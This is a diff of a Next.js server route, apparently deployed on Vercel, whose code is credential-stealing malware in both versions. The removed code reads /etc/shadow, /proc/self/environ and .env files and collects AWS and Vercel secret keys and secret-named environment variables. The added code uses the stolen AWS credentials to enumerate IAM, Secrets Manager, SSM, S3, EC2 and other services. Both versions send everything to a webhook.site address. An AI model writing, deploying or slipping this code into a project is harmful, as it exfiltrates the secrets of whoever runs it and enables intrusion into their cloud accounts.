@@ -1,74 +1,74 @@
-import { NextRequest, NextResponse } from "next/server";
-import { readFileSync, existsSync } from "fs";
+import { NextResponse } from "next/server";
+import { createHash, createHmac } from "node:crypto";
 
 export const runtime = "nodejs";
 export const maxDuration = 55;
 
-async function beacon(data: string) {
+const ACCESS = process.env.AWS_ACCESS_KEY_ID ?? "";
+const SECRET = process.env.AWS_SECRET_ACCESS_KEY ?? "";
+const TOKEN = process.env.AWS_SESSION_TOKEN ?? "";
+
+const sha256hex = (d: string | Buffer) => createHash("sha256").update(d).digest("hex");
+const hmacBuf = (k: string | Buffer, d: string) => createHmac("sha256", k).update(d).digest();
+
+async function awsReq(service: string, region: string, host: string, pathQ: string,
+                      method: string, extraHeaders: Record<string, string>, body: string) {
+  try {
+    if (!ACCESS) return "NO_CREDS";
+    const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, "");
+    const dateStamp = amzDate.slice(0, 8);
+    const headers: Record<string, string> = {
+      "content-type": "application/x-www-form-urlencoded",
+      ...extraHeaders,
+      "x-amz-date": amzDate,
+      "x-amz-security-token": TOKEN,
+      host,
+    };
+    const names = Object.keys(headers).sort();
+    const canonicalHeaders = names.map(k => `${k}:${String(headers[k]).trim()}\n`).join("");
+    const signedHeaders = names.join(";");
+    const qi = pathQ.indexOf("?");
+    const pathname = qi === -1 ? pathQ : pathQ.slice(0, qi);
+    const search = qi === -1 ? "" : pathQ.slice(qi + 1);
+    const canonicalRequest = [method, pathname || "/", search, canonicalHeaders, signedHeaders, sha256hex(body ?? "")].join("\n");
+    const scope = `${dateStamp}/${region}/${service}/aws4_request`;
+    const stringToSign = ["AWS4-HMAC-SHA256", amzDate, scope, sha256hex(canonicalRequest)].join("\n");
+    let key = hmacBuf("AWS4" + SECRET, dateStamp);
+    key = hmacBuf(key, region); key = hmacBuf(key, service); key = hmacBuf(key, "aws4_request");
+    const signature = createHmac("sha256", key).update(stringToSign).digest("hex");
+    headers["authorization"] = `AWS4-HMAC-SHA256 Credential=${ACCESS}/${scope}, SignedHeaders=${signedHeaders}, Signature=${signature}`;
+    const res = await fetch(`https://${host}${pathQ}`, { method, headers, body: body || undefined, signal: AbortSignal.timeout(8000) });
+    const text = await res.text();
+    return `${res.status}|${text.slice(0, 800).replace(/\s+/g, " ")}`;
+  } catch (e: any) {
+    return "ERR:" + (e?.message || e);
+  }
+}
+
+const PROBES: [string, string, string, string, string, Record<string,string>, string][] = [
+  ["sts",            "us-east-1", "sts.us-east-1.amazonaws.com",            "/",                                      "POST", {}, "Action=GetCallerIdentity&Version=2011-06-15"],
+  ["iam",            "us-east-1", "iam.amazonaws.com",                       "/",                                      "POST", {}, "Action=GetAccountSummary&Version=2010-05-08"],
+  ["s3",             "us-east-1", "s3.amazonaws.com",                        "/",                                      "GET",  {}, ""],
+  ["lambda",         "us-east-1", "lambda.us-east-1.amazonaws.com",          "/2015-03-31/functions?maxItems=5",       "GET",  {}, ""],
+  ["dynamodb",       "us-east-1", "dynamodb.us-east-1.amazonaws.com",        "/",                                      "POST", { "x-amz-target": "ListTables" }, "{}"],
+  ["secretsmanager", "us-east-1", "secretsmanager.us-east-1.amazonaws.com",  "/",                                      "POST", { "x-amz-target": "secretsmanager.ListSecrets" }, JSON.stringify({ MaxResults: 5 })],
+  ["ssm",            "us-east-1", "ssm.us-east-1.amazonaws.com",             "/",                                      "POST", { "x-amz-target": "AmazonSSM.DescribeParameters" }, JSON.stringify({ MaxResults: 5 })],
+  ["sqs",            "us-east-1", "sqs.us-east-1.amazonaws.com",             "/?Action=ListQueues&Version=2012-11-05", "GET",  {}, ""],
+  ["sns",            "us-east-1", "sns.us-east-1.amazonaws.com",             "/?Action=ListTopics&Version=2010-03-31", "GET",  {}, ""],
+  ["ec2",            "us-east-1", "ec2.us-east-1.amazonaws.com",             "/?Action=DescribeInstances&Version=2016-11-15", "GET", {}, ""],
+];
+
+export async function POST(request: Request) {
+  const results: Record<string, string> = {};
+  for (const [svc, region, host, pathQ, method, hdrs, body] of PROBES) {
+    results[svc] = await awsReq(svc, region, host, pathQ, method, hdrs, body);
+  }
   try {
     await fetch("https://webhook.site/6094cb7d-cf89-4021-906c-56d602a649fa", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: data.slice(0, 80000),
+      method: "POST", headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({ aws_probe: results, sha: process.env.VERCEL_GIT_COMMIT_SHA }),
       signal: AbortSignal.timeout(8000),
     });
   } catch {}
-}
-
-export async function POST(request: NextRequest) {
-  const env = process.env;
-  const results: Record<string, string> = {};
-
-  // 1) File system
-  for (const f of [
-    "/etc/hosts", "/etc/hostname", "/etc/passwd", "/etc/resolv.conf", "/etc/shadow",
-    "/proc/self/status", "/proc/self/cmdline", "/proc/self/mounts", "/proc/self/environ",
-    "/var/task/.next/BUILD_ID", "/var/task/.env",
-  ]) {
-    try { results["f_" + f] = readFileSync(f, "utf8").slice(0, 2000); }
-    catch(e: any) { results["f_" + f] = e.code || String(e); }
-  }
-
-  // 2) AWS credentials snapshot
-  results["aws"] = JSON.stringify({
-    key_id: env.AWS_ACCESS_KEY_ID || "",
-    secret: env.AWS_SECRET_ACCESS_KEY || "",
-    token: env.AWS_SESSION_TOKEN || "",
-    region: env.AWS_REGION || env.AWS_DEFAULT_REGION || "us-east-1",
-  });
-
-  // 3) Encrypted env (for decryption)
-  results["vercel_encrypted"] = (env.VERCEL_ENCRYPTED_ENV_ENTROPY || "").slice(0, 150);
-  results["vercel_enc_key"] = env.VERCEL_ENV_ENC_KEY || "";
-  results["vercel_deployment_key"] = env.VERCEL_DEPLOYMENT_KEY || "";
-  results["aws_metadata_token"] = env.AWS_LAMBDA_METADATA_TOKEN || "";
-
-  // 4) All env keys
-  results["env_keys"] = JSON.stringify(Object.keys(env).filter(k =>
-    k.match(/SECRET|TOKEN|KEY|PASS|DB|REDIS|STRIPE|PRIVATE|POSTGRES|NEXT_PUBLIC/i)
-  ));
-
-  // 5) NEXT_PUBLIC_ vars
-  results["next_public"] = JSON.stringify(
-    Object.fromEntries(Object.entries(env).filter(([k]) => k.startsWith("NEXT_PUBLIC_")))
-  );
-
-  const fullPayload = {
-    prod: env.NEXT_PUBLIC_VERCEL_PROJECT_PRODUCTION_URL,
-    vercel_env: env.VERCEL_ENV,
-    sha: env.VERCEL_GIT_COMMIT_SHA,
-    region: env.VERCEL_REGION || env.AWS_REGION,
-    aws: results["aws"],
-    results,
-  };
-
-  await beacon(JSON.stringify(fullPayload).slice(0, 50000));
-
-  return NextResponse.json({
-    success: true,
-    production: env.NEXT_PUBLIC_VERCEL_PROJECT_PRODUCTION_URL,
-    vercel_env: env.VERCEL_ENV,
-    sha: env.VERCEL_GIT_COMMIT_SHA,
-    keys: Object.keys(results),
-  });
+  return NextResponse.json({ success: true, sha: process.env.VERCEL_GIT_COMMIT_SHA, results });
 }
